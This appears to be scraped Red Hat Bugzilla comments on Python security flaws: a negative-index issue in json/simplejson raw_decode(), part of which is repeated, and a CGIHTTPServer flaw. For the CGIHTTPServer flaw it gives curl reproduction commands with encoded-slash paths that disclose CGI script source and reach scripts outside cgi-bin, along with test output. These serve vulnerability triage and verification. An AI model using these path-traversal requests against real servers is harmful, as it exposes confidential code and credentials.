						"thetext": "The original report suggests that this is a high severity issue because of \"ubiquity of JSON parsing in Python applications\".  However, practical impact seems rather limited.  To trigger the issue, negative value is passed as idx argument of raw_decode().  However, this argument is not documented in the Python standard library documentation, which currently says:\n\n  raw_decode(s)\n\n    Decode a JSON document from s (a str or unicode beginning with a JSON\n    document) and return a 2-tuple of the Python representation and the index\n    in s where the document ended.\n\n    This can be used to decode a JSON document from a string that may have\n    extraneous data at the end.\n\n  https://docs.python.org/2/library/json.html#json.JSONDecoder.raw_decode\n  https://docs.python.org/3/library/json.html#json.JSONDecoder.raw_decode\n\nTherefore, the idx argument for the function is rarely used.  I've not been able to identify any application that could pass arbitrary negative value as idx.  The only use of the idx argument uses the following pattern from decode(), which is used to strip leading spaces from the input string:\n\n  WHITESPACE = re.compile(r'\\s*', FLAGS)\n  _w=WHITESPACE.match\n  raw_decode(s, idx=_w(s, 0).end())\n\nThis does not allow passing arbitrary negative index value to raw_decode().\n\nIt should be noted that the json module that is part of Python standard library is based on simplejson, currently using version 2.0.9.  The json module was added to the Python standard library in version 2.6, therefore python packages in Red Hat Enterprise Linux 5 (using python 2.4.3) and older are not affected by this issue.  The python packages in Red Hat Enterprise Linux 6 (using python 2.6.6) use json module based on simplejson 1.9.  The code affected by this issue was only introduced later, and added to Python standard library as part of this rebase from 1.9 to 2.0.9:\n\nhttp://hg.python.org/cpython/rev/52199\nhttp://bugs.python.org/issue4136\n\nTherefore python packages in Red Hat Enterprise Linux 6 are not affected.  There are also python-simplejson packages shipped in Red Hat Enterprise Linux 5 and 6 (version 2.0.9), which are affected by this issue.\n\nRecent upstream versions of simplejson (such as the version used in Red Hat Software Collections 1) also mitigate this issue by not allowing arbitrary negative index in raw_decode().  Starting with version 2.6.1 (based on upstream git repository tags), raw_decode() also performs stripping of leading spaces, which deals with negative index as a side effect:\n\nhttps://github.com/simplejson/simplejson/commit/0fb0aea\n\nHowever, it is possible to reproduce the issue by calling (undocumented) scan_once() function directly.  This problem was reported to simplejson upstream via:\n\nhttps://github.com/simplejson/simplejson/issues/98\n\nFor the sake of completeness, API documentation of current upstream simplejson versions document idx argument for the raw_decode() function:\n\n  raw_decode(s[, idx=0])\n\n    Decode a JSON document from s (a str or unicode beginning with a JSON\n    document) starting from the index idx and return a 2-tuple of the Python\n    representation and the index in s where the document ended.\n\n    This can be used to decode a JSON document from a string that may have\n    extraneous data at the end, or to decode a string that has a series of\n    JSON objects.\n\n    JSONDecodeError will be raised if the given JSON document is not valid.\n\n  http://simplejson.readthedocs.org/en/latest/#simplejson.JSONDecoder.raw_decode"

There are also python-simplejson packages shipped in Red Hat Enterprise Linux 5 and 6 (version 2.0.9), which are affected by this issue.\n\nRecent upstream versions of simplejson (such as the version used in Red Hat Software Collections 1) also mitigate this issue by not allowing arbitrary negative index in raw_decode().  Starting with version 2.6.1 (based on upstream git repository tags), raw_decode() also performs stripping of leading spaces, which deals with negative index as a side effect:\n\nhttps://github.com/simplejson/simplejson/commit/0fb0aea\n\nHowever, it is possible to reproduce the issue by calling (undocumented) scan_once() function directly.  This problem was reported to simplejson upstream via:\n\nhttps://github.com/simplejson/simplejson/issues/98\n\nFor the sake of completeness, API documentation of current upstream simplejson versions document idx argument for the raw_decode() function:\n\n  raw_decode(s[, idx=0])\n\n    Decode a JSON document from s (a str or unicode beginning with a JSON\n    document) starting from the index idx and return a 2-tuple of the Python\n    representation and the index in s where the document ended.\n\n    This can be used to decode a JSON document from a string that may have\n    extraneous data at the end, or to decode a string that has a series of\n    JSON objects.\n\n    JSONDecodeError will be raised if the given JSON document is not valid.\n\n  http://simplejson.readthedocs.org/en/latest/#simplejson.JSONDecoder.raw_decode"

								"thetext": "Analysis:\n=========\n\nCGIHTTPServer is unable to handle certain URL-encoded path separators (like %2f etc). This can lead two consequences:\n\n1. Disclosure of the contents of a CGI script. This is bad because CGI scripts may contain confidential information like usernames/password used to connect to other backend services like databases etc. Also looking at CGI you could bypass intended restrictions on services and a lot of other consequences.\n\n2. You could execute other cgi scripts, which are outside the restricted \"cgi-bin\" directory or whatever directory is set via the \"cgi_directories\" parameter, which can have further consequences based on how your web application is designed.\n\nYou cannot however execute arbitrary commands, and the flaw is limited to the applications constructed using CGIHTTPServer module.\n\nHow to reproduce:\n=================\n1. To reproduce CGI script disclosure:\n\na. Create a directory (which will act as root for your webserver) and a cgi-bin directory within it.\n$ mkdir -p web/cgi-bin\n\nb. Create the following sample script inside the cgi-bin directory:\n$ cat test.py \n#!/usr/bin/env python2\nimport sys\n\ndb_credentials = \"SECRET\"\nsys.stdout.write(\"Content-type: text/html\\r\\n\\n\")\nsys.stdout.write(\"hello world!\")\n\nc. Start the web server from inside the \"web\" directory:\n$ python /usr/lib64/python2.7/CGIHTTPServer.py\n\nd. The following should work:\n$ curl http://localhost:8000/cgi-bin/test.py\nhello world!\n\ne. The following should not work (on a fixed version of python):\n$ curl http://localhost:8000/cgi-bin%2ftest.py\n#!/usr/bin/env python2\nimport sys\n\ndb_credentials = \"SECRET\"\nsys.stdout.write(\"Content-type: text/html\\r\\n\\n\")\nsys.stdout.write(\"hello world!\")\n\n2. To reproduce arbitrary cgi scripts.\n\na. Create a file called exploit.py in the root of the web server directory, with contents similar to test.py\n\nb. This should not work (on fixed version of python):\n$  curl http://localhost:8000/cgi-bin/..%2fexploit.py\nExploited!"

								"thetext": "(In reply to Huzaifa S. Sidhpurwala from comment #4)\n> Analysis:\n> =========\n> \n> CGIHTTPServer is unable to handle certain URL-encoded path separators (like\n> %2f etc). This can lead two consequences:\n> \n> 1. Disclosure of the contents of a CGI script. This is bad because CGI\n> scripts may contain confidential information like usernames/password used to\n> connect to other backend services like databases etc. Also looking at CGI\n> you could bypass intended restrictions on services and a lot of other\n> consequences.\n> \n> 2. You could execute other cgi scripts, which are outside the restricted\n> \"cgi-bin\" directory or whatever directory is set via the \"cgi_directories\"\n> parameter, which can have further consequences based on how your web\n> application is designed.\n> \n> You cannot however execute arbitrary commands, and the flaw is limited to\n> the applications constructed using CGIHTTPServer module.\n> \n> How to reproduce:\n> =================\n> 1. To reproduce CGI script disclosure:\n> \n> a. Create a directory (which will act as root for your webserver) and a\n> cgi-bin directory within it.\n> $ mkdir -p web/cgi-bin\n> \n> b. Create the following sample script inside the cgi-bin directory:\n> $ cat test.py \n> #!/usr/bin/env python2\n> import sys\n> \n> db_credentials = \"SECRET\"\n> sys.stdout.write(\"Content-type: text/html\\r\\n\\n\")\n> sys.stdout.write(\"hello world!\")\n> \n> c. Start the web server from inside the \"web\" directory:\n> $ python /usr/lib64/python2.7/CGIHTTPServer.py\n> \n> d. The following should work:\n> $ curl http://localhost:8000/cgi-bin/test.py\n> hello world!\n> \n> e. The following should not work (on a fixed version of python):\n> $ curl http://localhost:8000/cgi-bin%2ftest.py\n> #!/usr/bin/env python2\n> import sys\n> \n> db_credentials = \"SECRET\"\n> sys.stdout.write(\"Content-type: text/html\\r\\n\\n\")\n> sys.stdout.write(\"hello world!\")\n> \n> 2. To reproduce arbitrary cgi scripts.\n> \n> a. Create a file called exploit.py in the root of the web server directory,\n> with contents similar to test.py\n> \n> b. This should not work (on fixed version of python):\n> $  curl http://localhost:8000/cgi-bin/..%2fexploit.py\n> Exploited!\n\nRegarding scenario 2:\nI'm testing on python27-python-2.7.8-2.el6 (in rhscl-2.0). While it's not possible to execute cgi script outside of cgi-bin directory, it is possible to reveal its content. I've put test.py from your reproducer in \"web\" directory and then run \"curl http://localhost:8000/cgi-bin/..%2ftest.py\"\n\n:: [  BEGIN   ] :: Run script outside of cgi-bin :: actually running 'curl -s http://localhost:8000/cgi-bin/..%2ftest.py'\n127.0.0.1 - - [13/May/2015 11:02:19] \"GET /cgi-bin/..%2ftest.py HTTP/1.1\" 200 -\n#!/usr/bin/env python2\nimport sys\n\ndb_credentials = \"SECRET\"\nsys.stdout.write(\"Content-type: text/html\\r\\n\\n\")\nsys.stdout.write(\"hello world!\")"
